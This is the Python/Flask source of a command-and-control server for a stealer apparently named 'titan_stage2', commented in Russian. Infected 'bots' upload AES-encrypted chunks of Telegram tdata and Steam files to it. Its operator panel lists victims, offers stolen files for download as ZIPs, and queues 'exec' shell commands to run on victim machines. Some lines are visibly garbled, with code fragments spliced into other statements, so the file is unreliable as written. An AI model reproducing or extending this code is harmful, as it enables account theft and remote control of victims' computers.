# language: Python, file: app.py
# Railway C2 для titan_stage2. Приём чанков, запись на диск, никаких лимитов RAM.
import os
import io
import json
import time
import zipfile
import sqlite3
import secrets
import threading
import hashlib
from datetime import datetime, timezone
from functools import wraps

from flask import (Flask, request, jsonify, Response, render_template_string,
                   send_file, abort, redirect, url_for, session)
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ============================== КОНФИГ ==============================
C2_TOKEN   = os.environ.get("C2_TOKEN", "CHANGE_ME_TOKEN").encode()
PANEL_USER = os.environ.get("PANEL_USER", "admin")
PANEL_PASS = os.environ.get("PANEL_PASS", "admin")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(32))
AES_KEY = bytes.fromhex(os.environ.get(
    "AES_KEY_HEX",
    "9c1d4e77b28f31a5601cd3884af12b9e55037ca910ee648bd702f63948cc11aa"))
AES_IV = bytes.fromhex(os.environ.get(
    "AES_IV_HEX",
    "317a9c4d02be8850113f66cd779224eb"))

DATA_DIR   = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "./data")
BLOB_DIR   = os.path.join(DATA_DIR, "blobs")     # сырые чанки до сборки
FINAL_DIR  = os.path.join(DATA_DIR, "files")     # собранные файлы
DB_PATH    = os.path.join(DATA_DIR, "titan.db")
os.makedirs(BLOB_DIR, exist_ok=True)
os.makedirs(FINAL_DIR, exist_ok=True)

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024   # 64 МБ на запрос — с запасом

# ============================== БД ==============================
_db_lock = threading.Lock()

def db():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def db_init():
    with _db_lock, db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS bots (
            id           TEXT PRIMARY KEY,
            host         TEXT,
            user         TEXT,
            ip           TEXT,
            first_seen   INTEGER,
            last_seen    INTEGER,
            tdata_count  INTEGER DEFAULT 0,
            steam_count  INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS files (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id       TEXT,
            rel          TEXT,
            size         INTEGER DEFAULT 0,
            chunks_recv  INTEGER DEFAULT 0,
            chunks_total INTEGER DEFAULT 0,
            complete     INTEGER DEFAULT 0,
            disk_path    TEXT,
            received_at  INTEGER
        );
        CREATE UNIQUE INDEX IF NOT EXISTS idx_files_bot_rel ON files(bot_id, rel);
        CREATE TABLE IF NOT EXISTS commands (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id     TEXT,
            payload    TEXT,
            created    INTEGER,
            delivered  INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS events (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id   TEXT,
            kind     TEXT,
            message  TEXT,
            ts       INTEGER
        );
        """)

db_init()

# ============================== AES-256-CBC ==============================
def aes_decrypt(data: bytes) -> bytes:
    if not data or len(data) % 16 != 0:
        return b""
    try:
        c = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV),
                   backend=default_backend())
        d = c.decryptor()
        pt = d.update(data) + d.finalize()
        if pt:
            pad = pt[-1]
            if 1 <= pad <= 16 and pt[-pad:] == bytes([pad]) * pad:
                pt = pt[:-pad]
        return pt
    except Exception:
        return b""

def auth_required(fn):
    @wraps(fn)
    def w(*a, **kw):
        h = request.headers.get("Authorization", "")
        if not h.startswith("Bearer "):
            return jsonify({"error": "no auth"}), 401
        if not secrets.compare_digest(h[7:].encode(), C2_TOKEN):
            return jsonify({"error": "bad token"}), 403
        return fn(*a, **kw)
    return w

def panel_required(fn):
    @wraps(fn)
    def w(*a, **kw):
        if session.get("panel"):
            return fn(*a, **kw)
        return redirect(url_for("login", next=request.path))
    return w

def safe_bot(bot_id: str) -> str:
    return bot_id.replace("/", "_").replace("\\", "_")[:64]

def rel_to_disk(bot_id: str, rel: str) -> str:
    """Путь на диске для файла бота. Хешируем rel чтобы избежать traversal."""
    h = hashlib.sha256(rel.encode("utf-8")).hexdigest()[:24]
    return os.path.join(FINAL_DIR, safe_bot(bot_id), h)

# ============================== API ДЛЯ КЛИЕНТА ==============================
@app.route("/api/ingest", methods=["POST"])
@auth_required
def api_ingest():
    bot_id = request.headers.get("X-Bot-Id") or request.remote_addr or "unknown"
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    op = request.args.get("op", "meta")
    now = int(time.time())

    with _db_lock, db() as c:
        row = c.execute("SELECT id FROM bots WHERE id=?", (bot_id,)).fetchone()
        if row is None:
            "")
                size = int c.execute("""INSERT INTO bots (id, first_seen, last_seen, ip)
                         VALUES (?,?,?,?)""", (bot_id, now, now, ip))
        else:
            c.execute("UPDATE bots SET last_seen=?, ip=? WHERE id=?",
                      (now, ip, bot_id))

    if op == "meta":
        try:
            meta = json.loads(request.data.decode("utf-8", "replace") or "{}")
        except Exception:
            meta = {}
        with _db_lock, db() as c:
            c.execute("""UPDATE bots SET host=?, user=?, tdata_count=?, steam_count=?
                         WHERE id=?""",
                      (meta.get("host", ""), meta.get("user", ""),
                       int(meta.get("tdata_files", 0)),
                       int(meta.get("steam_files", 0)), bot_id))
            c.execute("INSERT INTO events (bot_id, kind, message, ts) VALUES (?,?,?,?)",
                      (bot_id, "hello",
                       f"tdata={meta.get('tdata_files',0)} steam={meta.get('steam_files',0)}",
                       now))
        return jsonify({"ok": True})

    if op == "list":
        try:
            listing = json.loads(request.data.decode("utf-8", "replace") or "[]")
        except Exception:
            listing = []
        with _db_lock, db() as c:
            for it in listing:
                rel = it.get("rel",(it.get("size", 0))
                if not rel:
                    continue
                c.execute("""INSERT INTO files (bot_id, rel, size, received_at)
                             VALUES (?,?,?,?)
                             ON CONFLICT(bot_id, rel) DO UPDATE SET
                               size=excluded.size""",
                          (bot_id, rel, size, now))
            c.execute("INSERT INTO events (bot_id, kind, message, ts) VALUES (?,?,?,?)",
                      (bot_id, "list", f"{len(listing)} files", now))
        return jsonify({"ok": True})

    return jsonify({"error": "unknown op"}), 400


# Приём чанка. Заголовки:
#   X-Bot-Id: <id>
#   X-Rel: <относительный путь файла, urlencoded>
#   X-Chunk-Seq: <номер чанка, от 0>
#   X-Chunk-Total: <всего чанков>
# Тело — AES-CBC зашифрованный кусок
@app.route("/api/chunk", methods=["POST"])
@auth_required
def api_chunk():
    bot_id = request.headers.get("X-Bot-Id") or "unknown"
    rel = request.headers.get("X-Rel", "")
    if not rel:
        return jsonify({"error": "no rel"}), 400
    try:
        seq = int(request.headers.get("X-Chunk-Seq", "0"))
        total = int(request.headers.get("X-Chunk-Total", "1"))
    except ValueError:
        return jsonify({"error": "bad seq"}), 400

    pt = aes_decrypt(request.data)
    if not pt:
        return jsonify({"error": "decrypt fail"}), 400

    now = int(time.time())
    disk = rel_to_disk(bot_id, rel)
    os.makedirs(os.path.dirname(disk), exist_ok=True)

    # Дописываем в .part, по завершении переименовываем в финальное имя
    part = disk + ".part"
    with open(part, "ab") as f:
        f.write(pt)

    with _db_lock, db() as c:
        c.execute("""UPDATE bots SET last_seen=? WHERE id=?""", (now, bot_id))
        row = c.execute("SELECT id, chunks_recv, chunks_total FROM files "
                        "WHERE bot_id=? AND rel=?", (bot_id, rel)).fetchone()
        if row is None:
            c.execute("""INSERT INTO files (bot_id, rel, size, chunks_recv,
                                            chunks_total, complete, disk_path, received_at)
                         VALUES (?,?,?,?,?,?,?,?)""",
                      (bot_id, rel, len(pt), seq + 1, total, 0, part, now))
        else:
            c.execute("""UPDATE files SET chunks_recv=?, chunks_total=?, received_at=?
                         WHERE id=?""",
                      (seq + 1, total, now, row["id"]))
        # если получен последний чанк — финализируем
        if seq + 1 >= total:
            try:
                os.replace(part, disk)
                sz = os.path.getsize(disk)
                c.execute("""UPDATE files SET complete=1, disk_path=?, size=?
                             WHERE bot_id=? AND rel=?""",
                          (disk, sz, bot_id, rel))
                c.execute("""INSERT INTO events (bot_id, kind, message, ts)
                             VALUES (?,?,?,?)""",
                          (bot_id, "file",
                           f"complete {rel} ({sz} bytes)", now))
            except OSError as e:
                return jsonify({"error": f"finalize fail: {e}"}), 500

    return jsonify({"ok": True, "seq": seq})


@app.route("/api/poll", methods=["POST"])
@auth_required
def api_poll():
    bot_id = request.headers.get("X-Bot-Id") or request.remote_addr or "unknown"
    with _db_lock, db() as c:
        c.execute("UPDATE bots SET last_seen=? WHERE id=?", (int(time.time()), bot_id))
        row = c.execute("""SELECT id, payload FROM commands
                           WHERE bot_id=? AND delivered=0 ORDER BY id LIMIT 1""",
                        (bot_id,)).fetchone()
        if row is None:
            return jsonify({})
        c.execute("UPDATE commands SET delivered=1 WHERE id=?", (row["id"],))
        return Response(row["payload"], mimetype="application/json")


# ============================== ПАНЕЛЬ ==============================
@app.route("/login", methods=["GET", "POST"])
def login():
    err = ""
    if request.method == "POST":
        u = request.form.get("u", "")
        p = request.form.get("p", "")
        if secrets.compare_digest(u, PANEL_USER) and secrets.compare_digest(p, PANEL_PASS):
            session["panel"] = True
            return redirect(request.args.get("next") or "/")
        err = "wrong credentials"
    return render_template_string(LOGIN_HTML, err=err)

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

@app.route("/")
@panel_required
def index():
    return render_template_string(PANEL_HTML)

@app.route("/api/panel/bots")
@panel_required
def panel_bots():
    now = int(time.time())
    with _db_lock, db() as c:
        rows = c.execute("""SELECT id, host, user, ip, first_seen, last_seen,
                            tdata_count, steam_count
                            FROM bots ORDER BY last_seen DESC""").fetchall()
        total = len(rows)
        alive = sum(1 for r in rows if now - r["last_seen"] < 300)
    return jsonify({"total": total, "alive": alive,
                    "bots": [dict(r) for r in rows]})

@app.route("/api/panel/bot/<bot_id>")
@panel_required
def panel_bot(bot_id):
    with _db_lock, db() as c:
        b = c.execute("SELECT * FROM bots WHERE id=?", (bot_id,)).fetchone()
        if not b:
            abort(404)
        files = c.execute("""SELECT rel, size, chunks_recv, chunks_total,
                             complete FROM files WHERE bot_id=?
                             ORDER BY rel""", (bot_id,)).fetchall()
        evs = c.execute("""SELECT kind, message, ts FROM events
                           WHERE bot_id=? ORDER BY ts DESC LIMIT 200""",
                        (bot_id,)).fetchall()
    return jsonify({"bot": dict(b),
                    "files": [dict(f) for f in files],
                    "events": [dict(e) for e in evs]})

@app.route("/api/panel/bot/<bot_id>/file/<path:rel>")
@panel_required
def panel_file(bot_id, rel):
    with _db_lock, db() as c:
        row = c.execute("""SELECT disk_path, complete FROM files
                           WHERE bot_id=? AND rel=?""", (bot_id, rel)).fetchone()
    if not row or not row["complete"] or not row["disk_path"]:
        abort(404)
    if not os.path.exists(row["disk_path"]):
        abort(404)
    return send_file(row["disk_path"], as_attachment=True,
                     download_name=os.path.basename(rel))

@app.route("/api/panel/bot/<bot_id>/download_zip")
@panel_required
def panel_download_zip(bot_id):
    """Отдаёт ZIP всех complete-файлов бота. Стримится, на диск не пишется."""
    with _db_lock, db() as c:
        rows = c.execute("""SELECT rel, disk_path FROM files
                            WHERE bot_id=? AND complete=1 AND disk_path IS NOT NULL""",
                         (bot_id,)).fetchall()
    if not rows:
        abort(404)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, allowZip64=True) as z:
        for r in rows:
            if os.path.exists(r["disk_path"]):
                z.write(r["disk_path"], arcname=r["rel"])
    buf.seek(0)
    return send_file(buf, as_attachment=True, mimetype="application/zip",
                     download_name=f"{safe_bot(bot_id)}.zip")

@app.route("/api/panel/cmd", methods=["POST"])
@panel_required
def panel_cmd():
    d = request.get_json(force=True, silent=True) or {}
    target = d.get("target", "all")
    op = d.get("op", "")
    params = d.get("params", {}) or {}
    if not op:
        return jsonify({"error": "no op"}), 400
    cmd = {"op": op}; cmd.update(params)
    payload = json.dumps(cmd, ensure_ascii=False)
    now = int(time.time())
    with _db_lock, db() as c:
        if target == "all":
            ids = [r["id"] for r in c.execute("SELECT id FROM bots").fetchall()]
        else:
            ids = [target]
        for bid in ids:
            c.execute("""INSERT INTO commands (bot_id, payload, created)
                         VALUES (?,?,?)""", (bid, payload, now))
    return jsonify({"ok": True, "queued": len(ids)})

@app.route("/api/panel/refresh", methods=["POST"])
@panel_required
def panel_refresh():
    d = request.get_json(force=True, silent=True) or {}
    target = d.get("target", "all")
    payload = '{"op":"rescan"}'
    now = int(time.time())
    with _db_lock, db() as c:
        if target == "all":
            ids = [r["id"] for r in c.execute("SELECT id FROM bots").fetchall()]
        else:
            ids = [target]
        for bid in ids:
            c.execute("""INSERT INTO commands (bot_id, payload, created)
                         VALUES (?,?,?)""", (bid, payload, now))
    return jsonify({"ok": True, "queued": len(ids)})

# ============================== HTML ==============================
LOGIN_HTML = r"""
<!doctype html><html><head><meta charset="utf-8"><title>C2 — login</title>
<style>
 body{background:#0a0b10;color:#c8e0c8;font-family:'Courier New',monospace;
      display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
 .box{background:#11131a;padding:36px;border:1px solid #1f3a1f;border-radius:8px;width:340px}
 h1{margin:0 0 24px;font-size:18px;color:#7dff7d;letter-spacing:2px}
 input{width:100%;padding:10px;margin:6px 0;background:#0a0b10;border:1px solid #1f3a1f;
       color:#c8e0c8;font-family:inherit;box-sizing:border-box}
 button{width:100%;padding:11px;background:#1f7a1f;color:#fff;border:0;cursor:pointer;
        font-family:inherit;letter-spacing:1px;margin-top:8px}
 button:hover{background:#2a9a2a}
 .err{color:#ff5555;margin-top:8px;font-size:12px}
</style></head><body>
<form class="box" method="post">
 <h1>◆ C2 PANEL</h1>
 <input name="u" placeholder="login" autofocus>
 <input name="p" type="password" placeholder="password">
 <button>ENTER</button>
 <div class="err">{{err}}</div>
</form></body></html>
"""

PANEL_HTML = r"""
<!doctype html><html><head><meta charset="utf-8"><title>C2</title>
<style>
 *{box-sizing:border-box}
 body{background:#0a0b10;color:#c8e0c8;font-family:'Courier New',monospace;margin:0;font-size:13px}
 header{background:#0f1118;border-bottom:1px solid #1f3a1f;padding:12px 20px;
        display:flex;justify-content:space-between;align-items:center}
 header h1{margin:0;font-size:15px;color:#7dff7d;letter-spacing:2px}
 .stat{display:flex;gap:20px;font-size:12px}
 .stat span b{color:#7dff7d}
 main{padding:20px}
 .grid{display:grid;grid-template-columns:340px 1fr;gap:20px;height:calc(100vh - 140px)}
 .botlist{border:1px solid #1f3a1f;background:#0f1118;overflow:auto}
 .bot{padding:10px 12px;border-bottom:1px solid #1a2a1a;cursor:pointer;font-size:12px}
 .bot:hover{background:#12161f}
 .bot.active{background:#172317;border-left:2px solid #7dff7d}
 .bot .id{color:#7dff7d;font-weight:bold;word-break:break-all}
 .bot .meta{color:#667;font-size:11px;margin-top:3px}
 .detail{border:1px solid #1f3a1f;background:#0f1118;padding:16px;overflow:auto}
 table{width:100%;border-collapse:collapse;margin-bottom:14px}
 th,td{text-align:left;padding:6px 10px;border-bottom:1px solid #1a2a1a;font-size:12px}
 th{color:#6a8a6a;font-weight:normal;text-transform:uppercase;letter-spacing:1px}
 .filelist li{padding:5px 0;border-bottom:1px solid #1a2a1a;list-style:none;
              display:flex;justify-content:space-between;font-size:12px;gap:8px}
 .filelist li a{color:#7dff7d;text-decoration:none;word-break:break-all}
 .filelist li a:hover{text-decoration:underline}
 .filelist li .meta{color:#556;flex-shrink:0;font-size:11px}
 .done{color:#7dff7d}.partial{color:#cc9}
 .console{background:#000;color:#7dff7d;font-family:'Courier New',monospace;padding:10px;
          height:180px;overflow:auto;border:1px solid #1f3a1f;font-size:12px;white-space:pre-wrap}
 .cmdrow{display:flex;gap:8px;margin-top:10px}
 .cmdrow input{flex:1;padding:9px;background:#0a0b10;border:1px solid #1f3a1f;color:#c8e0c8;
               font-family:inherit}
 .cmdrow button{padding:9px 18px;background:#1f7a1f;border:0;color:#fff;font-family:inherit;
                cursor:pointer}
 .kbd{padding:3px 8px;background:#1a2a1a;color:#7dff7d;border-radius:3px;font-size:11px;
      cursor:pointer;text-decoration:none;display:inline-block;margin-right:6px}
 h3{margin:0 0 12px;color:#7dff7d;font-size:13px;letter-spacing:1px}
 .notify{position:fixed;top:20px;right:20px;padding:12px 18px;background:#172317;
         border:1px solid #7dff7d;color:#7dff7d;font-size:12px;z-index:999}
 .online{color:#7dff7d}.offline{color:#666}
</style></head><body>

<header>
 <h1>◆ C2 PANEL</h1>
 <div class="stat">
  <span>total: <b id="s-total">0</b></span>
  <span>alive: <b id="s-alive">0</b></span>
 </div>
 <a href="/logout" style="color:#667;text-decoration:none;font-size:12px">logout</a>
</header>

<main>
 <div class="grid">
  <div class="botlist" id="botlist"></div>
  <div class="detail" id="botdetail">
   <div style="color:#556">выбери бота слева</div>
  </div>
 </div>
</main>

<script>
let CURRENT_BOT = null;

function notify(msg, ms=2500){
  const d = document.createElement('div');
  d.className = 'notify'; d.textContent = msg;
  document.body.appendChild(d);
  setTimeout(() => d.remove(), ms);
}
function esc(s){
  return String(s||'').replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}
function fmtBytes(n){
  n = n||0;
  if (n < 1024) return n + ' B';
  if (n < 1024*1024) return (n/1024).toFixed(1) + ' KB';
  if (n < 1024*1024*1024) return (n/1024/1024).toFixed(2) + ' MB';
  return (n/1024/1024/1024).toFixed(2) + ' GB';
}

async function refreshBots(){
  const r = await fetch('/api/panel/bots');
  const j = await r.json();
  document.getElementById('s-total').textContent = j.total;
  document.getElementById('s-alive').textContent = j.alive;
  const list = document.getElementById('botlist');
  list.innerHTML = '';
  for (const b of j.bots){
    const el = document.createElement('div');
    el.className = 'bot' + (b.id === CURRENT_BOT ? ' active' : '');
    const online = (Date.now()/1000 - b.last_seen) < 300;
    el.innerHTML = `<div class="id">${esc(b.id)}</div>
      <div class="meta">
        <span class="${online ? 'online' : 'offline'}">●</span>
        ${esc(b.host||'?')} \\ ${esc(b.user||'?')}<br>
        tdata: ${b.tdata_count} · steam: ${b.steam_count}
      </div>`;
    el.onclick = () => selectBot(b.id);
    list.appendChild(el);
  }
}

async function selectBot(id){
  CURRENT_BOT = id;
  await refreshBots();
  const r = await fetch('/api/panel/bot/' + encodeURIComponent(id));
  if (!r.ok){ document.getElementById('botdetail').innerHTML =
    '<div style="color:#f55">bot not found</div>'; return; }
  const j = await r.json();
  renderBot(j);
}

function renderBot(j){
  const b = j.bot;
  const files = (j.files || []);
  let totalRecv = 0, totalComplete = 0;
  const filesHtml = files.map(f => {
    totalRecv += f.size;
    if (f.complete) totalComplete++;
    const status = f.complete ? '<span class="done">✓</span>'
                              : `<span class="partial">${f.chunks_recv}/${f.chunks_total}</span>`;
    const link = f.complete
      ? `<a href="/api/panel/bot/${encodeURIComponent(b.id)}/file/${encodeURIComponent(f.rel)}">${esc(f.rel)}</a>`
      : `<span style="color:#556">${esc(f.rel)}</span>`;
    return `<li>${link} <span class="meta">${fmtBytes(f.size)} ${status}</span></li>`;
  }).join('');
  document.getElementById('botdetail').innerHTML = `
    <h3>${esc(b.id)}</h3>
    <table>
      <tr><td>host</td><td>${esc(b.host||'?')}</td>
          <td>user</td><td>${esc(b.user||'?')}</td></tr>
      <tr><td>ip</td><td>${esc(b.ip||'?')}</td>
          <td>last seen</td><td>${new Date(b.last_seen*1000).toLocaleString()}</td></tr>
      <tr><td>files</td><td>${files.length} (complete ${totalComplete})</td>
          <td>bytes</td><td>${fmtBytes(totalRecv)}</td></tr>
    </table>
    <div style="margin-bottom:10px">
      <a class="kbd" href="/api/panel/bot/${encodeURIComponent(b.id)}/download_zip">↓ download ZIP</a>
      <span class="kbd" onclick="refreshFiles('${esc(b.id)}')">↻ rescan</span>
    </div>
    <h3>Files (${files.length})</h3>
    <ul class="filelist">${filesHtml || '<li style="color:#556">пока пусто — жди</li>'}</ul>
    <h3 style="margin-top:20px">Консоль — exec</h3>
    <div class="console">${
      (j.events||[]).map(e =>
        `[${new Date(e.ts*1000).toLocaleTimeString()}] ${esc(e.kind)} — ${esc(e.message)}`
      ).join('\n')
    }</div>
    <div class="cmdrow">
      <input id="console-in" placeholder="cmd (whoami, ipconfig, ...)"
             onkeydown="if(event.key==='Enter')sendExec()">
      <button onclick="sendExec()">RUN</button>
    </div>
  `;
}

async function sendExec(){
  const inp = document.getElementById('console-in');
  const cmd = inp.value.trim();
  if (!cmd) return;
  const r = await fetch('/api/panel/cmd', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({target: CURRENT_BOT, op:'exec', params:{cmd}})
  });
  const j = await r.json();
  if (j.ok) notify(`queued exec`);
  inp.value = '';
}

async function refreshFiles(id){
  const r = await fetch('/api/panel/refresh', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({target: id})
  });
  const j = await r.json();
  if (j.ok) notify(`rescan queued`);
}

refreshBots();
setInterval(refreshBots, 5000);
setInterval(() => {
  if (CURRENT_BOT){
    fetch('/api/panel/bot/' + encodeURIComponent(CURRENT_BOT))
      .then(r => r.ok ? r.json() : null)
      .then(j => { if (j) renderBot(j); });
  }
}, 3000);
</script>
</body></html>
"""

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
